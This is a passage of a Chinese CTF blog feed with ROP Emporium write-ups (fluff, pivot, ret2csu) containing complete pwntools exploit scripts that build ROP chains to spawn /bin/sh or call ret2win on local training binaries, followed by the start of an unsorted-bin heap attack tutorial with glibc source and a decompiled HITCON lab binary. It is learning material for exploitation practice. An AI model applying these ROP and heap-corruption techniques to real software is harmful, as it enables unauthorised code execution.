class="keyword">else</span>:</span><br><span class="line">			binsh+=chr(c)</span><br><span class="line">	<span class="keyword">if</span> len(binsh)==<span class="number">8</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"a"</span>*<span class="number">0x20</span>+<span class="string">"a"</span>*<span class="number">0x8</span></span><br><span class="line">payload+=p64(pop_r12_r13_addr)+binsh+p64(bss_addr)+p64(mov_r13_r12_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(binsh)):</span><br><span class="line">	payload+=p64(pop_r14_r15_addr)</span><br><span class="line">	payload+=p64(xor_byte)</span><br><span class="line">	payload+=p64(bss_addr+i)</span><br><span class="line">	payload+=p64(xor_r15_r14_addr)</span><br><span class="line"></span><br><span class="line">payload+=p64(pop_rdi_addr)+p64(bss_addr)+p64(system_plt_addr)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="fluff-32"><a href="#fluff-32" class="headerlink" title="fluff_32"></a>fluff_32</h3><p>和前面的一样但是程序这次的gadget确实有点难利用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding="utf-8"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">"./fluff32"</span>)</span><br><span class="line"></span><br><span class="line">system_plt_addr=<span class="number">0x08048430</span></span><br><span class="line">bss_addr=<span class="number">0x0804a040</span></span><br><span class="line">mov_edx_addr=<span class="number">0x0804868c</span></span><br><span class="line">pop_ebx_addr=<span class="number">0x080483e1</span></span><br><span class="line">xor_edx_ebx=<span class="number">0x0804867b</span></span><br><span class="line">xchg_edx_ecx=<span class="number">0x08048689</span></span><br><span class="line">mov_ecx_edx=<span class="number">0x08048693</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"a"</span>*<span class="number">44</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#addr-&gt;ecx                   ##先将程序通过异或来放到edx中，然后在解密放到ecx中</span></span><br><span class="line"></span><br><span class="line">payload+=p32(mov_edx_addr)</span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=p32(bss_addr)</span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=p32(<span class="number">0xdefaced0</span>)</span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(xchg_edx_ecx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#data-&gt;edx                           #先将程序通过异或来放到edx中，然后再把edx中的解密</span></span><br><span class="line"></span><br><span class="line">payload+=p32(pop_ebx_addr)                     </span><br><span class="line">payload+=<span class="string">"/bin"</span></span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=p32(<span class="number">0xdefaced0</span>)</span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(mov_ecx_edx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#addr-&gt;ecx							#和上面一样，32位需要俩次才能把参数传完</span></span><br><span class="line"></span><br><span class="line">payload+=p32(mov_edx_addr)</span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=p32(bss_addr+<span class="number">4</span>)</span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=p32(<span class="number">0xdefaced0</span>)</span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(xchg_edx_ecx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#data-&gt;edx</span></span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=<span class="string">"/sh\x00"</span></span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=p32(<span class="number">0xdefaced0</span>)</span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(mov_ecx_edx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload+=p32(system_plt_addr)+p32(<span class="number">0</span>)+p32(bss_addr)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>感觉自己写的好麻烦，还需要异或俩次才可以，后来看了别人的wp发现，直接xor edx，edx 就不用第二次异或了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding="utf-8"</span></span><br><span class="line"><span class="keyword">from</span>  pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">"./fluff32"</span>)</span><br><span class="line"><span class="comment">#elf=ELF("./fluff32")		#换成这样也可以</span></span><br><span class="line">system_plt_addr=<span class="number">0x08048430</span>    <span class="comment"># system_plt_addr=elf.plt['system']</span></span><br><span class="line">bss_addr=<span class="number">0x0804a040</span>			 <span class="comment"># bss_addr=elf.bss()</span></span><br><span class="line">pop_ebx_addr=<span class="number">0x080483e1</span></span><br><span class="line">xor_edx_ebx=<span class="number">0x0804867b</span></span><br><span class="line">xchg_edx_ecx=<span class="number">0x08048689</span></span><br><span class="line">mov_ecx_edx=<span class="number">0x08048693</span></span><br><span class="line">xor_edx_edx=<span class="number">0x08048671</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"a"</span>*<span class="number">44</span></span><br><span class="line"><span class="comment">#addr-&gt;ecx</span></span><br><span class="line">payload+=p32(xor_edx_edx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=p32(bss_addr)</span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(xchg_edx_ecx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#data-&gt;edx</span></span><br><span class="line">payload+=p32(xor_edx_edx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=<span class="string">"/bin"</span></span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(mov_ecx_edx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#addr-&gt;ecx</span></span><br><span class="line">payload+=p32(xor_edx_edx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=p32(bss_addr+<span class="number">4</span>)</span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(xchg_edx_ecx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#data-&gt;edx</span></span><br><span class="line">payload+=p32(xor_edx_edx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=<span class="string">"/sh\x00"</span></span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(mov_ecx_edx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload+=p32(system_plt_addr)+p32(<span class="number">0</span>)+p32(bss_addr)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="fluff-64"><a href="#fluff-64" class="headerlink" title="fluff_64"></a>fluff_64</h3><p>用老方法查看gadget没找到合适的。。。 然后wp上说要加上 –depth ，加上以后就找到了 <del>_</del>  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding&#x3D;&quot;uft-8&quot;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;fluff&quot;)</span><br><span class="line">elf&#x3D;ELF(&quot;.&#x2F;fluff&quot;)</span><br><span class="line">system_plt_addr&#x3D;elf.plt[&#39;system&#39;]</span><br><span class="line">bss_addr&#x3D;elf.bss()</span><br><span class="line">xor_r11_r11_addr&#x3D;0x0000000000400822</span><br><span class="line">pop_r12_addr&#x3D;0x0000000000400832</span><br><span class="line">xor_r11_r12_addr&#x3D;0x000000000040082f</span><br><span class="line">xchg_r11_r10_addr&#x3D;0x0000000000400840</span><br><span class="line">mov_r10_r11_addr&#x3D;0x000000000040084e</span><br><span class="line">pop_rdi_addr&#x3D;0x00000000004008c3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#addr-&gt;r10</span><br><span class="line"></span><br><span class="line">payload&#x3D;&quot;a&quot;*0x20+&quot;a&quot;*0x8</span><br><span class="line">payload+&#x3D;p64(xor_r11_r11_addr)</span><br><span class="line">payload+&#x3D;p64(0)</span><br><span class="line">payload+&#x3D;p64(pop_r12_addr)</span><br><span class="line">payload+&#x3D;p64(bss_addr)</span><br><span class="line">payload+&#x3D;p64(xor_r11_r12_addr)</span><br><span class="line">payload+&#x3D;p64(0)</span><br><span class="line">payload+&#x3D;p64(xchg_r11_r10_addr)</span><br><span class="line">payload+&#x3D;p64(0)</span><br><span class="line"></span><br><span class="line">#data-&gt;r11</span><br><span class="line"></span><br><span class="line">payload+&#x3D;p64(xor_r11_r11_addr)</span><br><span class="line">payload+&#x3D;p64(0)</span><br><span class="line">payload+&#x3D;p64(pop_r12_addr)</span><br><span class="line">payload+&#x3D;&quot;&#x2F;bin&#x2F;sh\x00&quot;</span><br><span class="line">payload+&#x3D;p64(xor_r11_r12_addr)</span><br><span class="line">payload+&#x3D;p64(0)</span><br><span class="line">payload+&#x3D;p64(mov_r10_r11_addr)</span><br><span class="line">payload+&#x3D;p64(0)</span><br><span class="line">payload+&#x3D;p64(0)</span><br><span class="line"></span><br><span class="line">payload+&#x3D;p64(pop_rdi_addr)+p64(bss_addr)+p64(system_plt_addr)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pivot-32"><a href="#pivot-32" class="headerlink" title="pivot_32"></a>pivot_32</h3><p>感觉难度突然增加，有点绝望，果然pwn还是很难，这题呢主要考察俩个点，一个是栈的迁移，一个是泄露目标函数的地址，这里我用了俩种方法写，大同小异而已</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">sh=process(<span class="string">"./pivot32"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./pivot32"</span>)</span><br><span class="line">libc_elf=ELF(<span class="string">"./libpivot32.so"</span>)</span><br><span class="line"></span><br><span class="line">foothold_function_plt_addr=elf.plt[<span class="string">'foothold_function'</span>]</span><br><span class="line">foothold_function_got_addr=elf.got[<span class="string">'foothold_function'</span>]</span><br><span class="line">foothold_function_sym=libc_elf.symbols[<span class="string">'foothold_function'</span>]</span><br><span class="line">ret2win_sym=libc_elf.symbols[<span class="string">'ret2win'</span>]</span><br><span class="line">offset=int(ret2win_sym-foothold_function_sym)</span><br><span class="line"></span><br><span class="line">leave_ret=<span class="number">0x080486a8</span></span><br><span class="line">mov_eax_eax_addr=<span class="number">0x080488c4</span></span><br><span class="line">pop_eax_addr=<span class="number">0x080488c0</span></span><br><span class="line">pop_ebx_addr=<span class="number">0x08048571</span></span><br><span class="line">add_eax_ebx_addr=<span class="number">0x080488c7</span></span><br><span class="line">call_eax=<span class="number">0x080486a3</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"The Old Gods kindly bestow upon you a place to pivot: "</span>)</span><br><span class="line">fake_ebp=int(sh.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload1=p32(<span class="number">0</span>)</span><br><span class="line">payload1+=p32(foothold_function_plt_addr)</span><br><span class="line">payload1+=p32(pop_eax_addr)</span><br><span class="line">payload1+=p32(foothold_function_got_addr)</span><br><span class="line">payload1+=p32(mov_eax_eax_addr)</span><br><span class="line">payload1+=p32(pop_ebx_addr)</span><br><span class="line">payload1+=p32(offset)</span><br><span class="line">payload1+=p32(add_eax_ebx_addr)</span><br><span class="line">payload1+=p32(call_eax)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">"a"</span>*<span class="number">40</span></span><br><span class="line">payload2+=p32(fake_ebp)</span><br><span class="line">payload2+=p32(leave_ret)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>第二种方法就是将esp部分也用gadget表示，不用再向第一种一样伪造一个堆栈了，也就是说不用管ebp的值了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;pivot32&quot;)</span><br><span class="line">elf&#x3D;ELF(&quot;.&#x2F;pivot32&quot;)</span><br><span class="line">libc_elf&#x3D;ELF(&quot;.&#x2F;libpivot32.so&quot;)</span><br><span class="line"></span><br><span class="line">foothold_function_plt_addr&#x3D;elf.plt[&#39;foothold_function&#39;]</span><br><span class="line">foothold_function_got_addr&#x3D;elf.got[&#39;foothold_function&#39;]</span><br><span class="line">foothold_function_sym&#x3D;libc_elf.symbols[&#39;foothold_function&#39;]</span><br><span class="line">ret2win_sym&#x3D;libc_elf.symbols[&#39;ret2win&#39;]</span><br><span class="line">offset&#x3D;int(ret2win_sym-foothold_function_sym)</span><br><span class="line"></span><br><span class="line">mov_eax_eax_addr&#x3D;0x080488c4</span><br><span class="line">pop_eax_addr&#x3D;0x080488c0</span><br><span class="line">pop_ebx_addr&#x3D;0x08048571</span><br><span class="line">add_eax_ebx_addr&#x3D;0x080488c7</span><br><span class="line">call_eax&#x3D;0x080486a3</span><br><span class="line">pop_eax&#x3D;0x080488c0</span><br><span class="line">xchg_eax_esp&#x3D;0x080488c2</span><br><span class="line">sh.recvuntil(&quot;The Old Gods kindly bestow upon you a place to pivot: &quot;)</span><br><span class="line">fake_ebp&#x3D;int(sh.recv(10),16)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1&#x3D;p32(foothold_function_plt_addr)</span><br><span class="line">payload1+&#x3D;p32(pop_eax_addr)</span><br><span class="line">payload1+&#x3D;p32(foothold_function_got_addr)</span><br><span class="line">payload1+&#x3D;p32(mov_eax_eax_addr)</span><br><span class="line">payload1+&#x3D;p32(pop_ebx_addr)</span><br><span class="line">payload1+&#x3D;p32(offset)</span><br><span class="line">payload1+&#x3D;p32(add_eax_ebx_addr)</span><br><span class="line">payload1+&#x3D;p32(call_eax)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line"></span><br><span class="line">payload2&#x3D;&quot;a&quot;*40+&quot;a&quot;*4</span><br><span class="line">payload2+&#x3D;p32(pop_eax)</span><br><span class="line">payload2+&#x3D;p32(fake_ebp)</span><br><span class="line">payload2+&#x3D;p32(xchg_eax_esp)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pivot-64"><a href="#pivot-64" class="headerlink" title="pivot_64"></a>pivot_64</h3><p>这个题和32位的第二种方法一样，本来想用第一种方法的，但是在搜索leave；ret 的gadget时发现都存在<code>0a</code>截断，需要将<code>0a</code>变为其他字符，最后再用寄存器变成<code>0a</code>,程序第二次输入被限制了，我找了几个gadget发现输入都不够。还是自己太菜了 呜呜呜<del>~</del></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding&#x3D;&#39;utf-8&#39;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;pivot&quot;)</span><br><span class="line">elf&#x3D;ELF(&quot;.&#x2F;pivot&quot;)</span><br><span class="line">lib_elf&#x3D;ELF(&quot;.&#x2F;libpivot.so&quot;)</span><br><span class="line"></span><br><span class="line">fun_plt_addr&#x3D;elf.plt[&#39;foothold_function&#39;]</span><br><span class="line">fun_got_addr&#x3D;elf.got[&#39;foothold_function&#39;]</span><br><span class="line">fun_sym&#x3D;lib_elf.symbols[&#39;foothold_function&#39;]</span><br><span class="line">ret2win_sym&#x3D;lib_elf.symbols[&#39;ret2win&#39;]</span><br><span class="line">offset&#x3D;int(ret2win_sym-fun_sym)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;The Old Gods kindly bestow upon you a place to pivot: &quot;)</span><br><span class="line">heap_addr&#x3D;int(sh.recv(14),16)</span><br><span class="line"></span><br><span class="line">mov_rax_rax&#x3D;0x0000000000400b05</span><br><span class="line">pop_rax&#x3D;0x0000000000400b00</span><br><span class="line">xchg_rax_rsp&#x3D;0x0000000000400b02</span><br><span class="line">call_rax&#x3D;0x000000000040098e</span><br><span class="line">add_rax_rbp&#x3D;0x0000000000400b09</span><br><span class="line">pop_rbp&#x3D;0x0000000000400900</span><br><span class="line"></span><br><span class="line">payload1&#x3D;p64(fun_plt_addr)+p64(pop_rax)+p64(fun_got_addr)</span><br><span class="line">payload1+&#x3D;p64(mov_rax_rax)+p64(pop_rbp)+p64(offset)+p64(add_rax_rbp)</span><br><span class="line">payload1+&#x3D;p64(call_rax)</span><br><span class="line"></span><br><span class="line">payload2&#x3D;&#39;b&#39;*40+p64(pop_rax)+p64(heap_addr)+p64(xchg_rax_rsp)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="ret2csu-64"><a href="#ret2csu-64" class="headerlink" title="ret2csu_64"></a>ret2csu_64</h3><p>学到这里说明你已经将初级ROP学完了，这道题看似特别简单，只要找一个rdx的gadget将程序规定的参数传进去就好了，但是你会发现rdx的gadget找不到。程序在运行时，都会调用libc，<code>__libc_csu_init</code>这个函数时一个初始化函数，看一下他的反汇编发现，我们可以调用他的某些gadget来给rdx赋值。但是我们在调用的时候需要call一个函数，一开始我想要call ret2win，但是因为我们需要ret2win的指针所以没有成功。我们需要一个不改变任何寄存器的值，或者不改变rdx的值的函数，文章中说_init这个函数不会改变rdx的值，所以就用它了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding&#x3D;&#39;utf-8&#39;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;ret2csu&#39;)</span><br><span class="line">#elf&#x3D;ELF(&#39;.&#x2F;ret2csu&#39;)</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">ret2win&#x3D;0x00000000004007b1</span><br><span class="line">gadget_one&#x3D;0x000000000040089a</span><br><span class="line">gadget_two&#x3D;0x0000000000400880</span><br><span class="line">init_por&#x3D;0x600e38</span><br><span class="line">rdx&#x3D;0xdeadcafebabebeef</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;a&#39;*0x20+&#39;a&#39;*8</span><br><span class="line">payload+&#x3D;p64(gadget_one)</span><br><span class="line">payload+&#x3D;p64(0)</span><br><span class="line">payload+&#x3D;p64(0x01)</span><br><span class="line">payload+&#x3D;p64(init_por)</span><br><span class="line">payload+&#x3D;p64(0)</span><br><span class="line">payload+&#x3D;p64(0)</span><br><span class="line">payload+&#x3D;p64(rdx)</span><br><span class="line">payload+&#x3D;p64(gadget_two)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload+&#x3D;&#39;a&#39;*56</span><br><span class="line">payload+&#x3D;p64(ret2win)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;&gt;&#39;)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>判断异或数是多少可以绕过。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">binsh &#x3D; &#39;&#x2F;bin&#x2F;sh\x00&#39;</span><br><span class="line">badchar &#x3D; [98, 105, 99, 47, 32, 102, 110, 115]</span><br><span class="line">xornum &#x3D; 1</span><br><span class="line">while 1:</span><br><span class="line">    for x in binsh:</span><br><span class="line">        tmp &#x3D; ord(x) ^ xornum</span><br><span class="line">        if tmp in badchar:</span><br><span class="line">            xornum +&#x3D; 1</span><br><span class="line">            break</span><br><span class="line">        if x &#x3D;&#x3D; &quot;\x00&quot;:</span><br><span class="line">            print (xornum)</span><br><span class="line">            xornum +&#x3D;1</span><br><span class="line">    if xornum &#x3D;&#x3D; 10:</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
        <category>ROP Emporium</category>
        <category>stack</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ROP Emporium</tag>
        <tag>stack</tag>
      </tags>
  </entry>
  <entry>
    <title>Unsorted_Bin_Attack</title>
    <url>/2020/05/10/Unsorted_Bin_Attack/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2020/09/29/ZzDBFty64fueOsq.png" alt="alt"></p>
<a id="more"></a>

<h3 id="基本使用情况（CTF-WIKI）"><a href="#基本使用情况（CTF-WIKI）" class="headerlink" title="基本使用情况（CTF WIKI）"></a>基本使用情况（CTF WIKI）</h3><ol>
<li><p>Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，<strong>即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取</strong>。</p>
</li>
<li><p>在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中。</p>
</li>
</ol>
<h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* remove from unsorted list *&#x2F;</span><br><span class="line">if (__glibc_unlikely (bck-&gt;fd !&#x3D; victim))</span><br><span class="line">  malloc_printerr (&quot;malloc(): corrupted unsorted chunks 3&quot;);</span><br><span class="line">unsorted_chunks (av)-&gt;bk &#x3D; bck;</span><br><span class="line">bck-&gt;fd &#x3D; unsorted_chunks (av);</span><br></pre></td></tr></table></figure>

<p>可以看出当一个unsorted_chunk被取出来的时候，是依靠bk指针来进行chunk的取出的。如果我们控制了bk指针就可以将unsorted_chunks (av)写入到任何地方。</p>
<h3 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">victim &#x3D; unsorted_chunks(av)-&gt;bk&#x3D;p   </span><br><span class="line">bck &#x3D; victim-&gt;bk&#x3D;p-&gt;bk &#x3D; target addr-16</span><br><span class="line">unsorted_chunks(av)-&gt;bk &#x3D; bck&#x3D;target addr-16</span><br><span class="line">bck-&gt;fd &#x3D; *(target addr -16+16) &#x3D; unsorted_chunks(av);</span><br></pre></td></tr></table></figure>

<p>其中victim和p都代表最后一个chunk，unsorted_chunks(av)代表unsorted_bins链，bck代表倒数第二个chunk，target addr-16代表伪造地址。</p>
<p>可以看到最后target addr的数据被修改为unsorted_chunks(av)的地址。</p>
<p>这里我们做一道例题。</p>
<h3 id="HITCON-Training-lab14-magic-heap-例题在CTF-WIKI"><a href="#HITCON-Training-lab14-magic-heap-例题在CTF-WIKI" class="headerlink" title="HITCON Training lab14 magic heap(例题在CTF WIKI)"></a>HITCON Training lab14 magic heap(例题在CTF WIKI)</h3><h4 id="checksec检查"><a href="#checksec检查" class="headerlink" title="checksec检查"></a>checksec检查</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h4 id="main函数如下："><a href="#main函数如下：" class="headerlink" title="main函数如下："></a>main函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char *v3; &#x2F;&#x2F; rsi@1</span><br><span class="line">  char *v4; &#x2F;&#x2F; rdi@1</span><br><span class="line">  int v5; &#x2F;&#x2F; eax@2</span><br><span class="line">  char buf; &#x2F;&#x2F; [sp+0h] [bp-10h]@2</span><br><span class="line">  __int64 v7; &#x2F;&#x2F; [sp+8h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v7 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">  v3 &#x3D; 0LL;</span><br><span class="line">  v4 &#x3D; (char *)stdin;</span><br><span class="line">  setvbuf(stdin, 0LL, 2, 0LL);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      menu(v4, v3);</span><br><span class="line">      v3 &#x3D; &amp;buf;</span><br><span class="line">      read(0, &amp;buf, 8uLL);</span><br><span class="line">      v4 &#x3D; &amp;buf;</span><br><span class="line">      v5 &#x3D; atoi(&amp;buf);</span><br><span class="line">      if ( v5 !&#x3D; 3 )</span><br><span class="line">        break;</span><br><span class="line">      delete_heap(&amp;buf, &amp;buf);</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v5 &gt; 3 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v5 &#x3D;&#x3D; 4 )</span><br><span class="line">        exit(0);</span><br><span class="line">      if ( v5 &#x3D;&#x3D; 4869 )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( (unsigned __int64)magic &lt;&#x3D; 0x1305 )</span><br><span class="line">        &#123;</span><br><span class="line">          v4 &#x3D; &quot;So sad !&quot;;</span><br><span class="line">          puts(&quot;So sad !&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          v4 &#x3D; &quot;Congrt !&quot;;</span><br><span class="line">          puts(&quot;Congrt !&quot;);</span><br><span class="line">          l33t(&quot;Congrt !&quot;, &amp;buf);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_17:</span><br><span class="line">        v4 &#x3D; &quot;Invalid Choice&quot;;</span><br><span class="line">        puts(&quot;Invalid Choice&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( v5 &#x3D;&#x3D; 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      create_heap(&amp;buf, &amp;buf);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v5 !&#x3D; 2 )</span><br><span class="line">        goto LABEL_17;</span><br><span class="line">      edit_heap(&amp;buf, &amp;buf);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

